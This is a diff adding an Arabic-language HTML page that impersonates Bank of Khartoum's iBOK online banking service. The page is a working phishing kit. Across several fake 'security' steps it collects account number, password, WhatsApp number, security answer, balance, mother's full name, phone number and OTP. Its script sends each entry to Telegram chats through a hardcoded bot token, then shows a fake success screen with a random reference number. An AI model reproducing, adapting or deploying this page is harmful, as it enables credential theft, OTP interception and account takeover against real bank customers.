@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>أونلاين: تسجيل الدخول الاستمارة - iBOK</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-red: #bc262a;
+      --header-red: #cc1e23;
+      --yellow-banner: #ffca28;
+      --bg-dots: #f6f7f9;
+      --card-bg: #ffffff;
+      --text-dark: #2c3e50;
+      --text-muted: #7f8c8d;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      min-height: 100vh;
+      background-color: var(--bg-dots);
+      background-image: radial-gradient(#d1d1d1 1.2px, transparent 1.2px);
+      background-size: 16px 16px;
+      color: var(--text-dark);
+      direction: rtl;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* شاشة التحميل الشفافة */
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.75);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--primary-red);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: var(--primary-red);
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    /* الهيدر العلوي */
+    .red-top-banner {
+      width: 100%;
+      background-color: var(--header-red);
+      padding: 10px 16px 18px 16px;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+
+    .sub-banner-yellow {
+      width: 100%;
+      max-width: 420px;
+      background-color: var(--yellow-banner);
+      color: #1a1a1a;
+      font-weight: 700;
+      text-align: center;
+      padding: 8px 12px;
+      border-radius: 20px;
+      margin: 0 auto 8px auto;
+      font-size: 0.85rem;
+    }
+
+    .ibok-header-text {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      text-align: right;
+      color: white;
+    }
+
+    .ibok-header-text h2 {
+      font-size: 1.3rem;
+      font-weight: 800;
+    }
+
+    .ibok-header-text p {
+      font-size: 0.8rem;
+      opacity: 0.9;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 440px;
+      padding: 16px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page {
+      display: none;
+      width: 100%;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    .section-title {
+      text-align: center;
+      color: var(--primary-red);
+      font-weight: 800;
+      font-size: 1.25rem;
+      margin-bottom: 4px;
+    }
+
+    .section-sub {
+      text-align: center;
+      color: var(--text-dark);
+      font-size: 0.85rem;
+      margin-bottom: 16px;
+      line-height: 1.4;
+      font-weight: 600;
+    }
+
+    .title-line {
+      width: 80px;
+      height: 2px;
+      background-color: var(--primary-red);
+      margin: 0 auto 16px auto;
+    }
+
+    /* كروت الخدمات مطابقة للصور */
+    .service-card {
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+      cursor: pointer;
+      border: 1px solid #eaeaea;
+    }
+
+    .service-card.highlight {
+      border: 1.5px solid var(--primary-red);
+    }
+
+    .service-info h3 {
+      color: var(--primary-red);
+      font-size: 0.95rem;
+      font-weight: 700;
+      margin-bottom: 2px;
+    }
+
+    .service-info p {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+    }
+
+    .service-icon-box {
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+    }
+
+    /* نماذج الإدخال */
+    .form-card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 22px 18px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+      border: 1px solid #eaeaea;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      text-align: right;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.83rem;
+      font-weight: 700;
+      color: #444;
+      margin-bottom: 6px;
+    }
+
+    .form-control {
+      width: 100%;
+      background-color: #f8fafc;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      padding: 11px 14px;
+      font-size: 0.9rem;
+      color: #222;
+      outline: none;
+    }
+
+    .form-control:focus {
+      border-color: var(--primary-red);
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .toggle-eye {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 1rem;
+      opacity: 0.6;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: left;
+      color: var(--primary-red);
+      font-size: 0.75rem;
+      text-decoration: none;
+      margin-top: 6px;
+      font-weight: 600;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background-color: var(--primary-red);
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 5px;
+      box-shadow: 0 3px 8px rgba(188, 38, 42, 0.25);
+    }
+
+    .btn-submit:active {
+      opacity: 0.9;
+    }
+
+    /* نافذة أسئلة الأمان السوداء المطابقة تماماً للصورة */
+    .questions-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 200;
+      align-items: flex-end;
+      justify-content: center;
+    }
+
+    .questions-modal.active {
+      display: flex;
+    }
+
+    .questions-content {
+      background: #2b2626;
+      color: white;
+      width: 100%;
+      max-width: 440px;
+      max-height: 80vh;
+      border-top-left-radius: 16px;
+      border-top-right-radius: 16px;
+      overflow-y: auto;
+      padding: 10px 0;
+    }
+
+    .question-modal-title {
+      text-align: center;
+      padding: 12px;
+      font-size: 0.9rem;
+      color: #aaa;
+      border-bottom: 1px solid #3a3434;
+    }
+
+    .question-item {
+      padding: 14px 20px;
+      border-bottom: 1px solid #3a3434;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      font-size: 0.88rem;
+    }
+
+    .radio-circle {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #aaa;
+      border-radius: 50%;
+    }
+
+    /* شاشة النجاح النهائية المطابقة للصورة رقم 1000236775 */
+    .success-card {
+      background: white;
+      border-radius: 14px;
+      padding: 20px 16px;
+      border: 1px solid #d4edda;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+    }
+
+    .success-header {
+      color: #28a745;
+      font-weight: 800;
+      font-size: 1.15rem;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .success-sub {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #555;
+      margin-bottom: 16px;
+    }
+
+    .reference-box {
+      border: 2px dashed #a3d9a5;
+      background: #f8fff9;
+      border-radius: 10px;
+      padding: 12px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .reference-code {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #28a745;
+      letter-spacing: 1px;
+    }
+
+    .security-warning-box {
+      background-color: #fff8f8;
+      border: 1px solid #ffcdd2;
+      border-right: 4px solid var(--primary-red);
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 0.76rem;
+      color: #b71c1c;
+      line-height: 1.5;
+      margin-bottom: 16px;
+      text-align: right;
+    }
+
+    .user-data-summary {
+      background: #f1f5f9;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 0.78rem;
+      color: #334155;
+      margin-bottom: 16px;
+      text-align: right;
+      line-height: 1.6;
+    }
+
+    .instructions-text {
+      font-size: 0.75rem;
+      color: #475569;
+      line-height: 1.6;
+      text-align: right;
+    }
+
+    /* زر الواتساب السفلي الثابت */
+    .whatsapp-float {
+      position: fixed;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 92%;
+      max-width: 410px;
+      background: #25d366;
+      color: white;
+      border-radius: 25px;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-decoration: none;
+      z-index: 100;
+    }
+
+    .whatsapp-float svg {
+      width: 20px;
+      height: 20px;
+      fill: white;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شاشة التحميل الشفافة -->
+  <div id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">الرجاء الانتظار...</div>
+  </div>
+
+  <div class="red-top-banner">
+    <div class="sub-banner-yellow">
+      مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
+    </div>
+    <div class="ibok-header-text">
+      <h2>iBOK</h2>
+      <p>الاستمارة أونلاين Online Form</p>
+    </div>
+  </div>
+
+  <div class="container" style="padding-bottom: 70px;">
+
+    <!-- الصفحة 1: اختيار الخدمات -->
+    <div id="page-services" class="page active">
+      <div class="section-title">الاستمارة أونلاين</div>
+      <div class="section-sub">اختر نوع المشكلة التي تواجهها (ما يمكن معالجته عبر هذا القسم)</div>
+      <div class="title-line"></div>
+
+      <div class="service-card highlight" onclick="selectService('تحديث البيانات')">
+        <div class="service-info">
+          <h3>تحديث البيانات</h3>
+          <p>تأكيد وتوثيق مصادر الدخل الشهري والوظيفي دون الحاجة لزيارة الفرع.</p>
+        </div>
+        <div class="service-icon-box">💼</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('ربط حساب ثمرات')">
+        <div class="service-info">
+          <h3>ربط حساب بنك الخرطوم برنامج ثمرات</h3>
+          <p>أربط حسابك الشخصي بمنصة ثمرات لدعم الأسر السودانية.</p>
+        </div>
+        <div class="service-icon-box">🛡️</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('كشف الحساب')">
+        <div class="service-info">
+          <h3>كشف الحساب</h3>
+          <p>الحصول على كشف حساب مفصل.</p>
+        </div>
+        <div class="service-icon-box">📈</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('رفع السقف')">
+        <div class="service-info">
+          <h3>رفع السقف</h3>
+          <p>زيادة الحد اليومي للتحويلات.</p>
+        </div>
+        <div class="service-icon-box">📱</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('التحويلات الخاطئة')">
+        <div class="service-info">
+          <h3>التحويلات الخاطئة</h3>
+          <p>معالجة فورية للتحويلات الخاطئة.</p>
+        </div>
+        <div class="service-icon-box">✅</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('خدمات العملات الأجنبية')">
+        <div class="service-info">
+          <h3>خدمات العملات الأجنبية</h3>
+          <p>تفعيل وإدارة العملات الأجنبية.</p>
+        </div>
+        <div class="service-icon-box">💱</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('بطاقة فيزا افتراضية')">
+        <div class="service-info">
+          <h3>بطاقة فيزا افتراضية</h3>
+          <p>إصدار وإدارة بطاقات الفيزا الافتراضية.</p>
+        </div>
+        <div class="service-icon-box">💳</div>
+      </div>
+
+      <div class="service-card" onclick="selectService('تغير رقم الهاتف')">
+        <div class="service-info">
+          <h3>تغير رقم الهاتف القديم إلى رقم هاتف جديد.</h3>
+          <p>تغير رقم الهاتف القديم إلى رقم هاتف جديد.</p>
+        </div>
+        <div class="service-icon-box">🔄</div>
+      </div>
+    </div>
+
+    <!-- الصفحة 2: تسجيل الدخول الآمن -->
+    <div id="page-login" class="page">
+      <div class="form-card">
+        <div class="section-title">تسجيل الدخول الآمن</div>
+        <div class="section-sub" style="margin-top: 6px;">لدواعي أمنية، يرجى تسجيل الدخول ببيانات حسابك لدينا</div>
+        <div class="title-line"></div>
+
+        <form onsubmit="handleLoginSubmit(event)">
+          <div class="form-group">
+            <label>رقم الحساب:</label>
+            <input type="text" id="accountNumber" class="form-control" placeholder="أدخل رقم الحساب المكون من 6 أو 7 أرقام" maxlength="7" required>
+          </div>
+
+          <div class="form-group">
+            <label>كلمة مرور الحساب:</label>
+            <div class="input-wrapper">
+              <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+              <span class="toggle-eye" onclick="togglePassword()">👁</span>
+            </div>
+            <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
+          </div>
+
+          <button type="submit" class="btn-submit">تسجيل الدخول</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- الصفحة 3: التحقق الأمني المتقدم (واتساب) -->
+    <div id="page-whatsapp" class="page">
+      <div class="form-card">
+        <div class="section-title">التحقق الأمني المتقدم</div>
+        <div class="section-sub" style="margin-top: 6px;">لدواعي أمنية يرجى إدخال رقم واتساب فعال للتواصل</div>
+        <div class="title-line"></div>
+
+        <form onsubmit="handleWhatsappSubmit(event)">
+          <div class="form-group">
+            <label>رقم الواتساب:</label>
+            <input type="tel" id="whatsappNumber" class="form-control" placeholder="ادخل رقم واتساب للتواصل" required dir="ltr" style="text-align: right;">
+          </div>
+
+          <button type="submit" class="btn-submit">حفظ ومتابعة</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- الصفحة 4: سؤال الأمان -->
+    <div id="page-security" class="page">
+      <div class="form-card">
+        <div class="section-title">متابعة الاستمارة أونلاين</div>
+        <div class="section-sub" style="margin-top: 6px;">لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</div>
+        <div class="title-line"></div>
+
+        <form onsubmit="handleSecuritySubmit(event)">
+          <div class="form-group">
+            <label>الرجاء الإجابة على سؤال الأمان</label>
+            <div class="form-control" id="questionDisplay" onclick="openQuestionsModal()" style="cursor: pointer; display: flex; justify-content: space-between; align-items: center;">
+              <span id="selectedQuestionText" style="color: #666;">-- اختر سؤال الأمان --</span>
+              <span style="font-size: 0.7rem;">▼</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>ادخل الجواب</label>
+            <input type="text" id="securityAnswer" class="form-control" placeholder="اكتب جوابك هنا" required>
+          </div>
+
+          <button type="submit" class="btn-submit">إرسال</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- الصفحة 5: تأكيد التفاصيل المالية والهوية -->
+    <div id="page-finance" class="page">
+      <div class="form-card">
+        <div class="section-title">متابعة الاستمارة أونلاين</div>
+        <div class="section-sub" style="margin-top: 6px;">لأغراض الأمان يرجى تأكيد التفاصيل المالية وبيانات الهوية بالحساب</div>
+        <div class="title-line"></div>
+
+        <form onsubmit="handleFinanceSubmit(event)">
+          <div class="form-group">
+            <label>المبلغ الموجود في الحساب:</label>
+            <input type="text" id="finAmount" class="form-control" placeholder="أدخل المبلغ التقريبي أو الحالي" required>
+          </div>
+
+          <div class="form-group">
+            <label>إسم الوالدة رباعي:</label>
+            <input type="text" id="finMother" class="form-control" placeholder="أدخل إسم الوالدة بالكامل" required>
+          </div>
+
+          <div class="form-group">
+            <label>رقم الهاتف المرتبط بالحساب:</label>
+            <input type="tel" id="finPhone" class="form-control" placeholder="أدخل رقم شريحة الحساب" required>
+          </div>
+
+          <button type="submit" class="btn-submit">متابعة</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- الصفحة 6: رمز OTP -->
+    <div id="page-otp" class="page">
+      <div class="form-card">
+        <div class="section-title">إدخال رمز OTP</div>
+        <div class="section-sub" style="margin-top: 6px;">أدخل رمز التحقق المرسل الي بريدك الالكتروني او رقم الهاتف (OTP):</div>
+        <div class="title-line"></div>
+
+        <form onsubmit="handleOtpSubmit(event)">
+          <div class="form-group">
+            <input type="text" id="otpCode" class="form-control" placeholder="000000" maxlength="6" required style="text-align: center; font-size: 1.2rem; letter-spacing: 4px;">
+          </div>
+
+          <div style="color: var(--primary-red); font-size: 0.78rem; text-align: center; margin-bottom: 14px; font-weight: 700;">
+            إعادة إرسال الرمز خلال <span id="countdown">29:59</span> دقيقة
+          </div>
+
+          <button type="submit" class="btn-submit">التحقق الاعتمادي</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- الصفحة 7: شاشة النجاح النهائية المطابقة للصورة -->
+    <div id="page-success" class="page">
+      <div class="success-card">
+        <div class="success-header">✓ تم تسجيل ومعالجة طلبك بنجاح</div>
+        <div class="success-sub">الرجاء حفظ وتوثيق الرقم المرجعي التابع لك:</div>
+
+        <div class="reference-box">
+          <div class="reference-code" id="refCodeDisplay">BOK-18008599</div>
+        </div>
+
+        <div class="security-warning-box">
+          ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة. تقديم بيانات أو رموز غير صحيحة سيؤدي إلى رفض المعاملة فوراً بشكل تلقائي لحماية الحسابات من محاولات الدخول غير المصرح بها، وقد يعرض الحساب للتقييد المؤقت.
+        </div>
+
+        <div class="user-data-summary">
+          👤 عزيزي العميد، تم توثيق بيانات الهوية الرقمية التالية:<br>
+          • رقم الحساب المدخل: <span id="sumAccount"></span><br>
+          • إسم الوالدة: <span id="sumMother"></span><br>
+          • البريد الإلكتروني: 03546555545
+        </div>
+
+        <div class="instructions-text">
+          💬 <b>خطوات المتابعة:</b> يجب عليك الاحتفاظ بالرقم المرجعي الموضح أعلاه لتقديمه عند الحاجة. لقد تم تحويل استمارة المعالجة الحالية بنجاح إلى قسم التدقيق والرقابة الداخلية التابع لبنك الخرطوم للتحقق من سلامة الطلب واعتماده وتحديثه في الأنظمة المركزية. بناءً على السياسات الجديدة، سوف يتولى فريق الدعم الفني وخدمة العملاء المعتمدة مهمة المبادرة بالتواصل معك مباشرة، إما عبر إجراء اتصال هاتفي أو إرسال رسالة رسمية إليك على البريد الإلكتروني المسجل الظاهر في بيانات المراجعة أعلاه، وذلك لاستكمال كافة إجراءات الاعتماد والربط والتحقق النهائي، دون الحاجة للقيام بأي إجراء إضافي من طرفك في الوقت الرحمن.
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- نافذة أسئلة الأمان السوداء -->
+  <div class="questions-modal" id="questionsModal" onclick="closeQuestionsModal()">
+    <div class="questions-content" onclick="event.stopPropagation()">
+      <div class="question-modal-title">- اختر سؤال الأمان -</div>
+      <div class="question-item" onclick="selectQuestion('ما هو اسم ابن عمك الأول؟')">
+        <span>ما هو اسم ابن عمك الأول؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('في أي مدينة ولدت؟')">
+        <span>في أي مدينة ولدت؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('في أي سنة تخرجت من الجامعة؟')">
+        <span>في أي سنة تخرجت من الجامعة؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('اسم فريق كرة القدم المفضل لديك؟')">
+        <span>اسم فريق كرة القدم المفضل لديك؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('ما هو اسم المدرسة التي التحقت بها؟')">
+        <span>ما هو اسم المدرسة التي التحقت بها؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('ماذا كان لقبك أثناء الطفولة؟')">
+        <span>ماذا كان لقبك أثناء الطفولة؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('اسم مؤلفك المفضل؟')">
+        <span>اسم مؤلفك المفضل؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('اسم الشركة المصنعة للسيارة المفضلة لديك؟')">
+        <span>اسم الشركة المصنعة للسيارة المفضلة لديك؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('أي فيلم هو المفضل لديك؟')">
+        <span>أي فيلم هو المفضل لديك؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('اسم أفضل صديق في الطفولة؟')">
+        <span>اسم أفضل صديق في الطفولة؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('في أي عام حصلت على رخصة القيادة الخاصة بك؟')">
+        <span>في أي عام حصلت على رخصة القيادة الخاصة بك؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('العلامة التجارية لأول تلفزيون خاص بك؟')">
+        <span>العلامة التجارية لأول تلفزيون الخاص بك؟</span>
+        <span class="radio-circle"></span>
+      </div>
+      <div class="question-item" onclick="selectQuestion('في أي سنة تزوجت؟')">
+        <span>في أي سنة تزوجت؟</span>
+        <span class="radio-circle"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- زر قسم معالجة الطلبات للاستفسار (واتساب) الثابت أسفل الشاشة -->
+  <a href="https://wa.me/" class="whatsapp-float" target="_blank">
+    <svg viewBox="0 0 24 24"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38c1.45.79 3.08 1.21 4.79 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01-1.87-1.87-4.36-2.9-7.01-2.9zm0 1.83c2.18 0 4.23.85 5.77 2.38 1.54 1.54 2.38 3.59 2.38 5.77 0 4.5-3.67 8.17-8.17 8.17-1.45 0-2.85-.39-4.08-1.13l-.29-.17-3.03.8.81-2.95-.19-.31c-.8-1.28-1.22-2.77-1.22-4.3 0-4.5 3.67-8.17 8.17-8.17zM8.8 7.39c-.15-.33-.33-.34-.48-.35h-.41c-.14 0-.38.05-.58.26-.21.21-.79.77-.79 1.88s.81 2.18.92 2.33c.12.15 1.58 2.41 3.83 3.38 2.25.97 2.25.65 2.66.61.41-.04 1.33-.54 1.52-1.07.19-.53.19-.98.13-1.07-.06-.09-.23-.15-.48-.28s-1.48-.73-1.71-.81c-.23-.08-.4-.12-.57.12-.17.24-.66.81-.81.98-.15.17-.3.19-.55.06-.25-.13-1.05-.39-2-1.23-.74-.66-1.24-1.48-1.39-1.73-.15-.25-.02-.39.11-.52.12-.12.25-.3.38-.45.13-.15.17-.25.26-.42.09-.17.04-.32-.02-.45s-.48-1.16-.66-1.59z"/></svg>
+    قسم معالجة الطلبات للاستفسار
+  </a>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "9138194061:AAGlWJ5jhp8RIp3gLC2f7AQwKt_Jj9uFhZ0";
+    const TELEGRAM_CHAT_IDS = ["8362235682", "8965708637"];
+
+    let sessionData = {
+      service: "",
+      account: "",
+      password: "",
+      whatsapp: "",
+      question: "",
+      answer: "",
+      amount: "",
+      mother: "",
+      phone: "",
+      otp: ""
+    };
+
+    function showLoader(callback) {
+      const overlay = document.getElementById('loadingOverlay');
+      overlay.style.display = 'flex';
+      setTimeout(() => {
+        overlay.style.display = 'none';
+        if (callback) callback();
+      }, 1200);
+    }
+
+    function sendToTelegram(text) {
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: "HTML"
+          })
+        }).catch(err => console.log(err));
+      });
+    }
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function selectService(serviceName) {
+      sessionData.service = serviceName;
+      showPage('page-login');
+    }
+
+    function togglePassword() {
+      const pwd = document.getElementById('password');
+      pwd.type = pwd.type === 'password' ? 'text' : 'password';
+    }
+
+    function openQuestionsModal() {
+      document.getElementById('questionsModal').classList.add('active');
+    }
+
+    function closeQuestionsModal() {
+      document.getElementById('questionsModal').classList.remove('active');
+    }
+
+    function selectQuestion(qText) {
+      sessionData.question = qText;
+      document.getElementById('selectedQuestionText').innerText = qText;
+      document.getElementById('selectedQuestionText').style.color = '#222';
+      closeQuestionsModal();
+    }
+
+    function handleLoginSubmit(e) {
+      e.preventDefault();
+      sessionData.account = document.getElementById('accountNumber').value;
+      sessionData.password = document.getElementById('password').value;
+
+      const msg = `<b>📥 خدمة محددة:</b> ${sessionData.service}\n<b>رقم الحساب:</b> <code>${sessionData.account}</code>\n<b>كلمة المرور:</b> <code>${sessionData.password}</code>`;
+      sendToTelegram(msg);
+
+      showLoader(() => showPage('page-whatsapp'));
+    }
+
+    function handleWhatsappSubmit(e) {
+      e.preventDefault();
+      sessionData.whatsapp = document.getElementById('whatsappNumber').value;
+
+      const msg = `<b>📞 رقم الواتساب:</b> <code>${sessionData.whatsapp}</code>\n(حساب: ${sessionData.account})`;
+      sendToTelegram(msg);
+
+      showLoader(() => showPage('page-security'));
+    }
+
+    function handleSecuritySubmit(e) {
+      e.preventDefault();
+      sessionData.answer = document.getElementById('securityAnswer').value;
+
+      if (!sessionData.question) {
+        alert('الرجاء اختيار سؤال الأمان');
+        return;
+      }
+
+      const msg = `<b>🔒 سؤال الأمان:</b>\n${sessionData.question}\n<b>الإجابة:</b> <code>${sessionData.answer}</code>\n(حساب: ${sessionData.account})`;
+      sendToTelegram(msg);
+
+      showLoader(() => showPage('page-finance'));
+    }
+
+    function handleFinanceSubmit(e) {
+      e.preventDefault();
+      sessionData.amount = document.getElementById('finAmount').value;
+      sessionData.mother = document.getElementById('finMother').value;
+      sessionData.phone = document.getElementById('finPhone').value;
+
+      const msg = `<b>💰 التفاصيل المالية والهوية:</b>\nالمبلغ: ${sessionData.amount}\nإسم الوالدة: ${sessionData.mother}\nرقم الشريحة: ${sessionData.phone}\n(حساب: ${sessionData.account})`;
+      sendToTelegram(msg);
+
+      showLoader(() => {
+        showPage('page-otp');
+        startTimer();
+      });
+    }
+
+    function handleOtpSubmit(e) {
+      e.preventDefault();
+      sessionData.otp = document.getElementById('otpCode').value;
+
+      const msg = `<b>🔑 رمز الـ OTP النهائي:</b> <code>${sessionData.otp}</code>\n\n<b>الملخص الكامل:</b>\nحساب: <code>${sessionData.account}</code>\nمرور: <code>${sessionData.password}</code>\nواتساب: <code>${sessionData.whatsapp}</code>\nسؤال: ${sessionData.question}\nجواب: <code>${sessionData.answer}</code>\nالمبلغ: ${sessionData.amount}\nالوالدة: ${sessionData.mother}\nهاتف: ${sessionData.phone}`;
+      sendToTelegram(msg);
+
+      showLoader(() => {
+        document.getElementById('sumAccount').innerText = sessionData.account;
+        document.getElementById('sumMother').innerText = sessionData.mother;
+        
+        // توليد رقم مرعي عشوائي شبيه بالصورة
+        const randomRef = 'BOK-' + Math.floor(1000000 + Math.random() * 9000000);
+        document.getElementById('refCodeDisplay').innerText = randomRef;
+
+        showPage('page-success');
+      });
+    }
+
+    function startTimer() {
+      let duration = 29 * 60 + 59;
+      const display = document.getElementById('countdown');
+      const interval = setInterval(() => {
+        let m = parseInt(duration / 60, 10);
+        let s = parseInt(duration % 60, 10);
+        m = m < 10 ? "0" + m : m;
+        s = s < 10 ? "0" + s : s;
+        display.textContent = m + ":" + s;
+        if (--duration < 0) clearInterval(interval);
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
